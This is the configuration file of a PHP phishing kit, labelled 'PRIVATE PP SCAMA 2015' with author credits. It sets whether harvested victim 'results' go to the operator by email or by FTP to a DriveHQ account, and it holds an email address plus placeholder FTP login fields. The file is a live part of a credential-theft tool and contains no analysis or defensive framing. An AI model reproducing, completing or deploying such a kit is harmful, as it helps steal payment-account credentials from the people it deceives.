<?php



/*

+----------------------------------+

�--- PRIVATE  PP SCAMA   2015 -----�

�--------- BY Dz[NO_o]B -----------�

�----------- GREETZ TO ------------�

�--- Dz Phoniex : Dz Injector -----�

�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/










//___Results Details _________________________________________
$mail=1;
//1 : Send Results in mail
//0 : Don't Send Results in mail
$ftp=0;
//1 : Send Results in FTP
//0 : Don't Send Results in FTP
$a='majidtaik@live.fr';  //ENTER YOUR EMAIL , PLEASE MAKE SURE IT VALID
$b='azfmlafmlkzef'; //ENTER YOUR DRIVEHQ USERNAME
$c='fzlkefmlzkefm'; //ENTER YOUR DRIVEHQ PASSWORD

$instal=1; // DON'T CHANGE

?>


